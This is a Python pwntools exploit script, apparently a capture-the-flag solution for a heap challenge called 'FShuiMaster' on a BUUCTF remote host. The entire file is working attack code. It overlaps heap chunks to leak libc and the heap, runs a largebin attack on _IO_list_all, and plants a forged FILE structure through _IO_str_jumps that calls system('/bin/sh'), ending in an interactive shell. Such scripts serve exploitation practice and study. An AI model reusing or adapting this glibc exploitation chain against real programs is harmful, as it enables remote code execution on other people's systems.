# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './FShuiMaster'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28791'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , text = 'a'):
    cmd(1)
    sla('words?' , size)
    se( text)

def edit(idx , text):
    cmd(2)
    sla('change' , idx)
    sa(str(idx) + '\n' , text)

def show(idx ):
    cmd(4)
    sla('scan' , idx)

def delete(idx ):
    cmd(3)
    sla('off' , idx)
# one_gad = one_gadget(libc.path)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

def attack():
    
    sa('the Book\n' , '/bin/sh\x00\n')
    add(0x608 ) #0
    add(0x508 ) #1
    add(0x4f8 ) #2
    add(0x4f8 ) #3

    delete(0)
    edit(1 , 'a'*0x500 + p64(0x610 + 0x510))
    delete(2)
    add(0x608) #4
    show(1)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)
    IO_list_all = libc.symbols['_IO_list_all']
    IO_str_jumps = libc.address + 0x3e8360

    fake_file = pack_file(_IO_read_base = IO_list_all-0x10,
                    _IO_write_base=0,
                    _IO_write_ptr=1,
                    _IO_buf_base=binsh_addr,
                    _mode=0,)
    fake_file += p64(IO_str_jumps-8)+p64(0)+p64(system_addr)

    add(0x508) #5
    add(0x4f8) #6
    add(0x518) #7
    add(0x518) #8

    delete(1)
    delete(7)
    add(0x508 ,  'a'*0x8) #9
    show(5)

    ru('a'*0x8)
    heap_addr = uu64(6)
    add(0x518) #10
    delete(9)

    add(0x518)
    delete(3)
    edit(5 , flat(__malloc_hook + 0x10 + 1168,__malloc_hook + 0x10 + 1168,heap_addr+0xf10,IO_list_all-0x20) + '\n')
    add(0x528)
    add(0x4f8 , fake_file[0x10:])
    edit(5 , fake_file[0x10:])

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   FShuiMaster.py
@Time    :   2022/02/12 14:54:04
@Author  :   Niyah 
'''